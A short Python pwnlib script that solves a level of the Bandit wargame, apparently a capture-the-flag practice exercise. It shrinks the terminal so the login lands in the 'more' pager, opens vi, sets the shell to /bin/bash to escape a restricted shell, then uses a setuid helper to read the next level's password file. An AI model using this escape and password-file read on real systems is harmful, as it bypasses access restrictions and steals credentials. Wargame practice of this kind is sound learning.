from util import *

shell = open_ssh_key()

# to get the 'more' session, a tty must be created,
# but pwnlib always creates ttys at the same size as the actual terminal
# so it is necessary to set a fake tty height and disable the mechanism to update it
with force_term_size(h=4):
    proc = shell.shell()

# we are dropped into a 'more' session, because the tty height is smaller than the number of lines printing

proc.send("v")  # from 'more', open vi
proc.sendline(":set shell=/bin/bash")  # from 'vi'
proc.sendline(":sh")
proc.clean(0.5)

# now we have a shell
proc.send("./bandit27-do cat /etc/bandit_pass/bandit27")
proc.clean(0.5)
proc.sendline()

pwd = proc.clean(0.5)

pwd = pwd.split()[0]
write(password(), pwd)
